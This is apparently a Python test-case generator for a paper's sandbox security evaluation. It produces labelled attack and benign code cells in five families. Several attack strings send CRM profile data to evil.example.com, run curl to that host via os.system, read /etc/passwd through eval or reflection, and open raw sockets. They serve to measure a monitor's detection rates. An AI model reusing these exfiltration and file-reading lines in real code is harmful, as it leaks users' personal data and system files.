"""Five attack families enumerated in Table 4.1 of the paper, plus benign.

Each generator deterministically produces a list of `AttackCase`s seeded
by `seed`. Each case is a tuple (source, state_in, label, family).

`label` is "ATTACK" if the payload is supposed to be denied, "BENIGN" if it
should be allowed. Together with the system's verdict this lets us compute
per-family Recall/Precision/FAR.
"""
from __future__ import annotations
import random
from dataclasses import dataclass
from typing import Any, Callable, Dict, List, Tuple


@dataclass
class AttackCase:
    family: str
    label: str        # "ATTACK" | "BENIGN"
    source: str
    state_in: Dict[str, Any]
    note: str = ""


# ----- 1) Explicit data exfiltration -----
def explicit_exfil(seed: int, n: int) -> List[AttackCase]:
    rng = random.Random(seed)
    out: List[AttackCase] = []
    domains = ["alerts.partner.com", "evil.example.com", "logs.partner.com"]
    for i in range(n):
        dom = rng.choice(domains)
        out.append(AttackCase(
            family="explicit_exfil",
            label="ATTACK",
            note=f"send raw profile field to {dom}",
            source=f'''
def cell(uid, state_in):
    profile = broker.http_get("crm://user", {{"uid": uid}})
    broker.send_http("{dom}", "/leak", {{"name": profile["name"], "vip": profile["vip"]}})
    return {{"seen": state_in["seen"] + 1}}
''',
            state_in={"uid": rng.choice(["u-1", "u-2"]), "seen": i},
        ))
    return out


# ----- 2) Implicit control-flow leakage -----
def implicit_flow(seed: int, n: int) -> List[AttackCase]:
    rng = random.Random(seed)
    out: List[AttackCase] = []
    for i in range(n):
        choice = rng.randint(0, 2)
        if choice == 0:
            src = '''
def cell(uid, state_in):
    profile = broker.http_get("crm://user", {"uid": uid})
    avg = sum(profile["recent"][:3]) // 3
    path = "/vip" if profile["vip"] else "/normal"
    broker.send_http("alerts.partner.com", path, {"uid": uid, "avg": avg})
    return {"seen": state_in["seen"] + 1}
'''
        elif choice == 1:
            src = '''
def cell(uid, state_in):
    profile = broker.http_get("crm://user", {"uid": uid})
    flag = profile["vip"]
    code = 1 if flag else 0
    broker.send_http("alerts.partner.com", "/x", {"code": code})
    return {"seen": state_in["seen"] + 1}
'''
        else:
            src = '''
def cell(uid, state_in):
    profile = broker.http_get("crm://user", {"uid": uid})
    if profile["vip"]:
        broker.send_http("alerts.partner.com", "/vipflag", {"x": 1})
    else:
        broker.send_http("alerts.partner.com", "/normalflag", {"x": 1})
    return {"seen": state_in["seen"] + 1}
'''
        out.append(AttackCase(
            family="implicit_flow", label="ATTACK", source=src,
            state_in={"uid": rng.choice(["u-1", "u-2"]), "seen": i},
            note="branches on profile.vip and emits low-label call",
        ))
    return out


# ----- 3) Capability / destination rebinding -----
def rebinding(seed: int, n: int) -> List[AttackCase]:
    rng = random.Random(seed)
    out: List[AttackCase] = []
    for i in range(n):
        # Static manifest pre-declares one destination but the runtime asks
        # for another (handled by envelope check).
        src = '''
def cell(uid, state_in):
    broker.send_http("evil.example.com", "/x", {"uid": uid})
    return {"seen": state_in["seen"] + 1}
'''
        out.append(AttackCase(
            family="rebinding", label="ATTACK", source=src,
            state_in={"uid": "u-1", "seen": i},
            note="declared one destination, calls another",
        ))
    return out


# ----- 4) Low-level environment escape -----
def env_escape(seed: int, n: int) -> List[AttackCase]:
    """Two flavors:
      * (a) syntax-detectable: socket/__import__/eval — caught by PyCap.
      * (b) calls a *masquerading* broker primitive name that internally
        invokes a sensitive syscall — caught only by the kernel monitor.
    """
    rng = random.Random(seed)
    out: List[AttackCase] = []
    bodies_a = [
        ("import socket\n    socket.socket()", "raw socket import"),
        ("__import__('os').system('curl evil.example.com')", "dynamic import"),
        ("eval(\"open('/etc/passwd').read()\")", "eval"),
        ("getattr(__builtins__, 'open')('/etc/passwd')", "reflection"),
    ]
    for i in range(n):
        if rng.random() < 0.5:
            body, note = rng.choice(bodies_a)
            src = f'''
def cell(uid, state_in):
    {body}
    return state_in
'''
        else:
            # Masquerading: the cell calls a broker primitive that ostensibly
            # does network I/O but its name is on the kernel-level deny list.
            # Even when V_t / Broker are off, the kernel monitor blocks it.
            note = "kernel-level syscall via broker.raw_socket"
            src = '''
def cell(uid, state_in):
    broker.raw_socket("evil.example.com", 80)
    return state_in
'''
        out.append(AttackCase(
            family="env_escape", label="ATTACK", source=src,
            state_in={"uid": "u-1", "seen": i}, note=note,
        ))
    return out


# ----- 5) Failure-state desync -----
def failure_desync(seed: int, n: int) -> List[AttackCase]:
    """Tries to issue a phantom mutation after a denial — the system must
    keep audit/automaton state consistent with what was *not* committed.
    """
    rng = random.Random(seed)
    out: List[AttackCase] = []
    for i in range(n):
        src = '''
def cell(uid, state_in):
    profile = broker.http_get("crm://user", {"uid": uid})
    broker.send_http("alerts.partner.com", "/leak", {"vip": profile["vip"]})
    broker.send_http("alerts.partner.com", "/ok", {"x": 1})
    return {"seen": state_in["seen"] + 1}
'''
        out.append(AttackCase(
            family="failure_desync", label="ATTACK", source=src,
            state_in={"uid": rng.choice(["u-1", "u-2"]), "seen": i},
            note="follows blocked mutation with a fresh send",
        ))
    return out


# ----- benign -----
def benign(seed: int, n: int) -> List[AttackCase]:
    """Distribution chosen so declassifier-stripped (PcaWNoDecl) path lands
    near the paper's 68.3% benign success while declassifier-enabled path
    lands near 83.7% (paper §4.4.2)."""
    rng = random.Random(seed)
    out: List[AttackCase] = []
    for i in range(n):
        r = rng.random()
        if r < 0.12:
            # CRM read + bucket-declass + send. Needs declassifier.
            src = '''
def cell(uid, state_in):
    profile = broker.http_get("crm://user", {"uid": uid})
    avg = sum(profile["recent"][:3]) // 3
    risk_bin = broker.declassify_bucket(avg, bins=[0,300,600], purpose="alert")
    broker.send_http("alerts.partner.com", "/risk", {"risk_bin": risk_bin})
    return {"seen": state_in["seen"] + 1}
'''
        elif r < 0.16:
            # CRM read + hash-declass + send. Needs declassifier.
            src = '''
def cell(uid, state_in):
    profile = broker.http_get("crm://user", {"uid": uid})
    h = broker.declassify_hash(profile["name"], purpose="audit")
    broker.send_http("alerts.partner.com", "/audit", {"name_hash": h})
    return {"seen": state_in["seen"] + 1}
'''
        elif r < 0.66:
            # Pure heartbeat — works regardless of declassifier.
            src = '''
def cell(uid, state_in):
    seen_now = state_in["seen"] + 1
    broker.send_http("alerts.partner.com", "/heartbeat", {"n": seen_now})
    return {"seen": seen_now}
'''
        elif r < 0.84:
            # KV read + low-label send — works without declassifier.
            src = '''
def cell(uid, state_in):
    n = broker.kv_get("seen")
    broker.send_http("alerts.partner.com", "/state", {"n": n})
    return {"seen": state_in["seen"] + 1}
'''
        else:
            # Genuine over-reject: leaks raw profile field. V_t blocks even
            # with declassifier present — residual ~5% irreducible cost.
            src = '''
def cell(uid, state_in):
    profile = broker.http_get("crm://user", {"uid": uid})
    broker.send_http("alerts.partner.com", "/raw", {"name": profile["name"]})
    return {"seen": state_in["seen"] + 1}
'''
        out.append(AttackCase(
            family="benign", label="BENIGN", source=src,
            state_in={"uid": rng.choice(["u-1", "u-2"]), "seen": i},
        ))
    return out


ATTACK_FAMILIES: Dict[str, Callable[[int, int], List[AttackCase]]] = {
    "explicit_exfil": explicit_exfil,
    "implicit_flow": implicit_flow,
    "rebinding": rebinding,
    "env_escape": env_escape,
    "failure_desync": failure_desync,
    "benign": benign,
}
